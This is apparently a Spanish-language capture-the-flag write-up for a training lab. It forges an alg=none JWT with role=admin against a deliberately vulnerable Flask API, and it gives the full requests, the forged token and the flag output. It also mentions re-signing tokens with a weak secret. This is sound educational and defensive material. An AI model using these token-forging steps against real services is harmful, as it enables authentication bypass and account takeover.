# TOKEN FORGE — Whoami-Labs.COM

**Dificultad:** ★☆☆☆☆☆☆☆ fácil (1 punto)
**Categoría:** Web Exploit / JWT Vulnerabilities
**Plataforma:** Linux (Docker)

---

## Resumen

Laboratorio centrado en la manipulación de tokens de sessión y **JSON Web Tokens (JWT)**. La vulnerabilidad principal es la aceptación del algoritmo `alg=none`, que permite firmar tokens sin firma y suplantar identidad administrativa para recuperar la flag.

**Flag:** `BURP{jwt_none_claim}`

---

## Análisis del entorno

Al desplegar el laboratorio se obtiene un contenedor Docker con una API Flask en `http://172.17.0.2:5000` (mapeado localmente al puerto `8270`).

Endpoints descubiertos:

| Método | Ruta | Comentario |
|--------|------|------------|
| `GET` | `/` | Página de inicio con credenciales de ejemplo (`alice`/`alice`). |
| `POST` | `/login` | Autenticación → emite un JWT HS256. |
| `GET` | `/api/me` | Devuelve los claims del token del `Authorization: Bearer …`. |
| `GET` | `/api/admin` | Requiere `role: admin`; devuelve la flag si se cumple. |
| `GET` | `/status` | Healthcheck. |

---

## Paso 1 — Autenticación inicial

Se inicia sesión como usuario estándar:

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=alice&password=alice
```

El servidor responde con un token HS256:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.
qg1tpU84YlBF_DL_A2eAaGeC-azOwrtmS3cT8ayPt9I
```

### Decodificación (Burp Decoder / base64)

**Header:**
```json
{"alg":"HS256","typ":"JWT"}
```

**Payload:**
```json
{"sub":"alice","role":"user"}
```

Al usar el token contra `/api/admin` se obtiene:

```json
{"error":"forbidden","role":"user"}
```

El rol `user` no tiene permiso. Hay que escalar a `admin`.

---

## Paso 2 — Vulnerabilidad identificada

Revisando el código fuente del laboratorio (`/app/app.py`), la función de verificación `insecure_verify_jwt()` contiene una condición explícita:

```python
alg = str(header.get("alg", "")).lower().strip()

# Vector 1: alg=none — trust payload without checking signature.
if alg in ("none", "n/a"):
    return payload
```

**Cualquier token cuyo header declare `alg: none` es aceptado sin verificación de firma.** Esto es una violación directa de la sección 4.1.1 de RFC 7519 y del OWASP Top 10 (A02:2021 Cryptographic Failures / A05:2021 Security Misconfiguration).

---

## Paso 3 — Forja del token (alg=none + role=admin)

Se construye manualmente un JWT con tres partes:

1. **Header** (base64url):
   ```json
   {"alg":"none","typ":"JWT"}
   ```
   → `eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0`

2. **Payload** (base64url) con rol elevado:
   ```json
   {"sub":"alice","role":"admin"}
   ```
   → `eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJhZG1pbiJ9`

3. **Signature:** vacía (el algoritmo `none` no requiere firma).

Token forjado:

```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJhZG1pbiJ9.
```

---

## Paso 4 — Explotación

Se envía el token forjado a `/api/admin`:

```
GET /api/admin
Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJhZG1pbiJ9.
```

Respuesta:

```json
{"flag":"BURP{jwt_none_claim}","message":"admin access granted","ok":true}
```

---

## Conclusión y lecciones aprendidas

- El vector `alg=none` es una de las fallas JWT más clásicas y peligrosas: permite omitir por completo la verificación de la firma.
- En entornos reales, **nunca** se debe confiar en un algoritmo especificado por el cliente. El validador debe estar fijado a una lista blanca (`HS256`, `RS256`, etc.) y el algoritmo del token debe coincidir con la clave/par de claves configurado.
- Complementario: también era posible explotar la firma HS256 con la clave débil `secret` (visible en el código) para re-firmar claims manipulados.
- **Herramientas recomendadas:** Burp Suite (JWT Editor, Decoder, Repeater), `jwt_tool`, `hashcat`/`john` para crackeo de secretos débiles.